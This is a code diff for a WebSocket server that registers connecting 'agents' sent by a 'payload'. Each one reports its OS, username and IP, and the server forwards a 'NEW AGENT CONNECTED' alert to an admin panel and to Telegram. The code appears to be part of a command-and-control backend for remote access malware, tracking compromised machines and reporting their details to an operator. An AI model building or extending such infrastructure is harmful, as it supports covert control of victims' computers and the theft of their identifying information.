@@ -107,16 +107,22 @@ wss.on('connection', (ws, req) => {
  return;
  }
 
+ // If payload sends its own ID in 'info', we use that to update existing or create new
  if (data.type === 'info') {
- // If this is a reconnection with the same ID, update existing client
+ if (data.id && data.id !== id) {
+ // It's a reconnect or re-registration with a known ID
  if (clients[data.id]) {
  clients[data.id].ws = ws;
  clients[data.id].lastSeen = Date.now();
  clients[data.id].info = data;
  } else {
+ clients[data.id] = { ws, info: data, lastSeen: Date.now(), isAdmin: false };
+ }
+ } else {
  clients[id].info = data;
  clients[id].lastSeen = Date.now();
  }
+ 
  notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
  broadcastToAdmin(id, data);
  notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
